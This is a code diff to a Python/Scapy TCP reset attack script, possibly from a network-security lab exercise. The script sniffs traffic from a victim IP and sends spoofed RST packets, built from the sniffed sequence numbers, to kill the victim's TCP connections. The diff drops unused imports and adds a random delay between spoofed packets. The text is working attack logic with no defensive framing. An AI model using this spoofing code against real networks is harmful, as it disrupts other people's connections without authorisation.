@@ -4,9 +4,6 @@
 
 import sys  #for command line argument
 import time
-import os
-import shutil
-import tempfile
 from random import randint
 from scapy.all import *
 from scapy.layers.inet import *
@@ -34,6 +31,8 @@ def sendRST(pkt):
     TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
     spoofpkt = IPLayer/TCPLayer
     send(spoofpkt, verbose=1)
+
+    time.sleep(randint(1, 2))
 
 
 pkt = sniff(filter="tcp and src host " + victim_ip, prn=sendRST, store=0)
